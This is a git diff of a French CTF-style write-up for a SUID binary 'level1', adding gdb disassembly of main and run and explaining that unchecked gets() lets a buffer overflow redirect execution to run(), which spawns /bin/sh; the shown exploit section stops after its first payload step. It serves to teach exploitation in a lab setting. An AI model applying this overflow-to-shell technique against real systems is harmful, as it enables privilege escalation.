@@ -6,7 +6,7 @@
     -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
   [...]
   ```
-    - On a un binaire appartenant a level2 dans le home
+    - On a un binaire appartenant a level2 dans le home avec les droits SUID.
 
 - `./level1`
   ```
@@ -17,8 +17,9 @@
       - rien
 
 - `gdb level1`
+  - `set disassembly-flavor intel`
   - `info function`
-    ```
+    ```asm
     [...]
       0x08048444  run
       0x08048480  main
@@ -26,42 +27,76 @@
     ```
     - On trouve une fonction run en plus du main
   - `disas main`
+    ```asm
+    Dump of assembler code for function main:
+       0x08048480 <+0>:	push   ebp
+       0x08048481 <+1>:	mov    ebp,esp
+       0x08048483 <+3>:	and    esp,0xfffffff0
+       0x08048486 <+6>:	sub    esp,0x50
+       0x08048489 <+9>:	lea    eax,[esp+0x10]
+       0x0804848d <+13>:	mov    DWORD PTR [esp],eax
+       0x08048490 <+16>:	call   0x8048340 <gets@plt>
+       0x08048495 <+21>:	leave
+       0x08048496 <+22>:	ret
+    End of assembler dump.
     ```
-      Dump of assembler code for function main:
-    [...]
-      0x08048486 <+6>:    sub    esp,0x50
-    [...]
-      0x08048490 <+16>:   call   0x8048340 <gets@plt>
-    [...]
-    ```
-    - Le programme alloue 80 octets (0x50) pour stocker ses variables dans la stack, puis fait un appel a gets()
+    - <+0> ... <+6>
+      - Initialisation de la mémoire (libère 80 octets pour la stack et aligne la mémoire)<br/><br/>
+    - <+9> ... <+16>
+      - Stocke l'adresse de esp + 16 dans eax
+      - Stocke la valeur de eax (l'adresse de esp + 16) dans la stack (à esp)
+      - Call gets() avec le paramètre stocké dans la stack<br/><br/>
+    - <+21> ... <+22>
+      - réinitialisation de la mémoire, fin d'exécution<br/><br/>
+    - Le call a gets() n'est pas protégé par une condition
     - La fonction run n'est pas appelée
     
   - `disas run`
+    ```asm
+    Dump of assembler code for function run:
+       0x08048444 <+0>:	push   ebp
+       0x08048445 <+1>:	mov    ebp,esp
+       0x08048447 <+3>:	sub    esp,0x18
+       0x0804844a <+6>:	mov    eax,ds:0x80497c0
+       0x0804844f <+11>:	mov    edx,eax
+       0x08048451 <+13>:	mov    eax,0x8048570
+       0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
+       0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
+       0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
+       0x0804846a <+38>:	mov    DWORD PTR [esp],eax
+       0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
+       0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
+       0x08048479 <+53>:	call   0x8048360 <system@plt>
+       0x0804847e <+58>:	leave
+       0x0804847f <+59>:	ret
+    End of assembler dump.
     ```
-      Dump of assembler code for function run:
-    [...]
-      0x08048451 <+13>:	mov    eax,0x8048570
-    [...]
-      0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
-      0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
-      0x08048479 <+53>:	call   0x8048360 <system@plt>
-    [...]
-    ```
-    - La fonction run met la valeur située à 0x8048570 dans eax
-    - Call fwrite() avec la valeur dans eax (donc la valeur à 0x8048570):
-      - `x/s 0x8048570`
-        ```
-          0x8048570:	 "Good... Wait what?\n"
-        ```
-    - Call system() avec la valeur située à 0x8048584:
-      - `x/s 0x8048584`
-        ```
-          0x8048584:	 "/bin/sh"
-        ```
+    - <+0> ... <+3>
+      - Initialisation de la mémoire (libère 24 octets pour la stack et aligne la mémoire)<br/><br/>
+    - <+6> ... <+41>
+      - Stocke la valeur dans le registre data segment à l'adresse 0x80497c0 dans eax, puis dans edx
+        - `x/s 0x80497c0`
+          - `0x80497c0 <stdout@@GLIBC_2.0>:	 ""`
+      - Stocke la valeur à l'adresse 0x8048570 dans eax
+        - `x/s 0x8048570`
+          - `0x8048570:	 "Good... Wait what?\n"`
+      - Stocke la valeur de edx (stdout) dans la stack (à esp + 12)
+      - Stocke 0x13 (19) dans la stack (à esp + 8)
+      - Stocke 0x1 (1) dans la stack (à esp + 4)
+      - Stocke la valeur de eax dans la stack (à esp)
+      - Call fwrite() avec les arguments stockés dans la stack<br/><br/>
+    - <+46> ... <+53>
+      - Stocke la valeur à l'adresse 0x8048584 dans la stack (à esp)
+        - `x/s 0x8048584`
+          - `0x8048584:	 "/bin/sh"`
+      - Call system() avec l'argument stocké dans la stack<br/><br/>
+    - <+58> ... <+59>
+      - réinitialisation de la mémoire, fin d'exécution<br/><br/>
+    - La fonction run affiche "Good... Wait what?\n" sur la sortie standard et lance un shell via la commande system()
+
 ## Exploit
 
-- L'objectif va être de forcer l'appel de la fonction 'run' par 'main'.
+- L'objectif va être de forcer l'appel de la fonction run() par la fonction main().
 - On va tirer avantage de la [vulnérabilité de gets à un buffer overflow](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351) pour écrire l'adresse de run dans l'EIP. 
 - Comme vu plus haut, main alloue 80 octets dans la stack pour ses variables, on va commencer par là:
   - `python -c 'print "a" * 80' > /tmp/exploit`
